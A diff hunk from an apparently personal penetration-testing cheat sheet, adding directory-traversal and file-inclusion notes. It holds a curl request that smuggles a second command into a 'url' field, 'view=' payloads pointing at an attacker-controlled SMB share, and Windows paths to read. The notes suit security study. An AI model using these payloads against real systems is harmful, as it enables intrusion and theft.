@@ -1821,6 +1821,10 @@ curl -d '{"user":"clumsyadmin","url":"http://192.168.45.175:443/updatefile.elf;n
 ============ Directory Traversal && LFI ===========================================================================
 
 ## Directory Traversal
+- First add index.php
+  - index.php?view=index.php  // this way we can check the file through view source
+  - index.php?view=//10.10.14.19/kali
+  - index.php?view=\\10.10.14.19\kali
 - Check DT vulnerability On windows: Check both absolute path && relative path
   - C:\Windows\System32\drivers\etc\hosts
   - C:\inetpub\logs\LogFiles\W3SVC1\
